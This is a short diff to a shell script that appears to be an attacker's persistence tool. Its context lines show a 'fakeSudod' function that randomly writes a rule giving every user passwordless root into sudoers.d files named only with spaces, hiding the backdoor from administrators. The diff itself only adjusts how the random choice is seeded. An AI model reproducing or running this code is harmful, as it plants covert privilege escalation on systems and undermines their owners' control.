@@ -1,5 +1,7 @@
 #!/bin/sh
 
+RANDOM=$$$(date +%s)
+
 #############
 #   USERS   #
 #############
@@ -125,7 +127,7 @@ sudoAll() {
   done
 }
 fakeSudod() {
-  randomVal=$(($RANDOM % 3))
+  randomVal=$((RANDOM % 3))
   case $randomVal in
     0)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/" ";;
     1)  echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/"  ";;
